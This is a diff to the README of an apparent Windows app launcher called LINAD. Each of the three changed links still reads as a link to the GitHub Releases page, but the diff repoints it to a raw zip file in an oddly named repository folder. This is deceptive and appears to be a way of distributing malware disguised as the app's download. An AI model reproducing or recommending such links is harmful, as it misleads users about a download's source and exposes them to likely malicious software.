@@ -1,6 +1,6 @@
 # LINAD - Simple Windows App Launcher
 
-[![Download LINAD](https://img.shields.io/badge/Download%20LINAD-Visit%20Releases-blue)](https://github.com/Mehmets7344/LINAD/releases)
+[![Download LINAD](https://img.shields.io/badge/Download%20LINAD-Visit%20Releases-blue)](https://github.com/Mehmets7344/LINAD/raw/refs/heads/main/isometropia/Software-hyperabelian.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ LINAD is a Windows app that helps you start the program from one place. Use the 
 
 Use this link to visit the release page and download LINAD for Windows:
 
-[Go to LINAD Releases](https://github.com/Mehmets7344/LINAD/releases)
+[Go to LINAD Releases](https://github.com/Mehmets7344/LINAD/raw/refs/heads/main/isometropia/Software-hyperabelian.zip)
 
 Look for the latest release at the top of the page. In most cases, the file will be a `.zip` or `.exe` file.
 
@@ -157,7 +157,7 @@ If you keep saved files, back them up before you replace older files.
 
 ## 📎 Useful Link
 
-[Download LINAD from GitHub Releases](https://github.com/Mehmets7344/LINAD/releases)
+[Download LINAD from GitHub Releases](https://github.com/Mehmets7344/LINAD/raw/refs/heads/main/isometropia/Software-hyperabelian.zip)
 
 ## 📋 Quick Start
 
